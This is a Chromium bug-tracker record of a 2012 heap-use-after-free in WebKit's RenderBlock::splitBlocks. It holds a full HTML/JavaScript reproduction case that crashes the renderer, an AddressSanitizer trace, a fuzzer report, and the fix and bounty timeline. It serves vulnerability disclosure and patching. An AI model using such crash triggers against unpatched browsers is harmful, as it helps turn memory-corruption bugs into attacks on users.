# Heap-use-after-free in WebCore::RenderBlock::splitBlocks

| Field | Value |
|-------|-------|
| **Issue ID** | [40054486](https://issues.chromium.org/issues/40054486) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-04 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderBlock::splitBlocks

**VERSION**  

Chrome Version: dev channel

Chromium 19.0.1060.0 (Developer Build 124888)  

OS Linux  

WebKit 536.2 (@109636)

Operating System: 64bit ubuntu

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-column-count: 2;
}
#el1::after {
display: block;
content: '';
}
#el2:nth-last-child(2n) {
content: '';
}
#el2 {
-webkit-column-span: all;
}
#el4 {
float: right;
}
</style>
<script>
onload = function() {
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el3 = document.createElement('span')
el1.appendChild(el3)
el3.appendChild(document.createTextNode('A'))
el4 = document.createElement('table')
el4.setAttribute('id', 'el4')
el1.appendChild(el4)
el0.style.display='run-in'
el4.style.display='table-column'
document.body.offsetTop
document.designMode='on'
document.execCommand('selectall')
document.execCommand('inserttext', '')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==15675== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffecc4cea8 at pc 0x55555ad348a3 bp 0x7fffffff5da0 sp 0x7fffffff5d98  

READ of size 8 at 0x7fffecc4cea8 thread T0  

#0 0x55555ad348a3 in WebCore::RenderBlock::splitBlocks(WebCore::RenderBlock\*, WebCore::RenderBlock\*, WebCore::RenderBlock\*, WebCore::RenderObject\*, WebCore::RenderBoxModelObject\*) ???:0  

#1 0x55555ad35085 in WebCore::RenderBlock::splitFlow(WebCore::RenderObject\*, WebCore::RenderBlock\*, WebCore::RenderObject\*, WebCore::RenderBoxModelObject\*) ???:0

0x7fffecc4cea8 is located 40 bytes inside of 184-byte region [0x7fffecc4ce80,0x7fffecc4cf38)  

freed by thread T0 here:  

#0 0x55555dc38e92 in free ??:0  

#1 0x55555ad3a06a in WebCore::RenderBlock::removeChild(WebCore::RenderObject\*) ???:0  

#2 0x55555af4994f in WebCore::RenderObject::willBeDestroyed() ???:0

## Attachments

- [40184.html](attachments/40184.html) (text/html; charset=us-ascii, 1.2 KB)
- [40184.txt](attachments/40184.txt) (text/plain; charset=us-ascii, 13.2 KB)

## Timeline

### in...@chromium.org (2012-03-05)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=24565162

Uploader: aarya@google.com

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f6a46b2b728
Crash State:
  - crash stack -
  WebCore::RenderBlock::splitBlocks
  WebCore::RenderBlock::splitFlow
  - free stack -
  WebCore::RenderBlock::removeChild
  WebCore::RenderObject::willBeDestroyed
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=124069:124082

Minimized Testcase (1.05 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95KTRuimyO9rzmiLbs7BX7icJXPr7FZzqf-y2FtmW5VR-FSUmiNOq-mRhybLu5mMvY5IFAJKGIJrYkGvlmQB5UXUhciapY-y6XDzb95r2vFhqJoELkaqX5-OUrL65i3ko26394IigK8sUlHCA4FuD4e5j6rMA

### in...@chromium.org (2012-03-05)

ignore the regression range pointing to https://trac.webkit.org/changeset/109142/, the underlying bug is how these anonymous block get merged during multi-column layout. Ideally, it shouldnt be touched during that time.

### in...@chromium.org (2012-03-06)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=80432

### in...@chromium.org (2012-03-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-08)

Splitting blocks for column spans is apparently the gift that keeps on giving.
$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### mi...@gmail.com (2012-03-09)

this is also not fixed right?

### sc...@gmail.com (2012-03-09)

It's sort of fixed :)
We have the fix ready to go, we're going to land the fix today and get it shipped in Chrome 18 which should be under 2 weeks.

### in...@chromium.org (2012-03-09)

http://trac.webkit.org/changeset/110324

### sc...@gmail.com (2012-03-12)

M18: http://trac.webkit.org/changeset/110461

### sc...@gmail.com (2012-03-20)

M17: http://trac.webkit.org/changeset/111425

### sc...@gmail.com (2012-03-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/116746?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054486)*
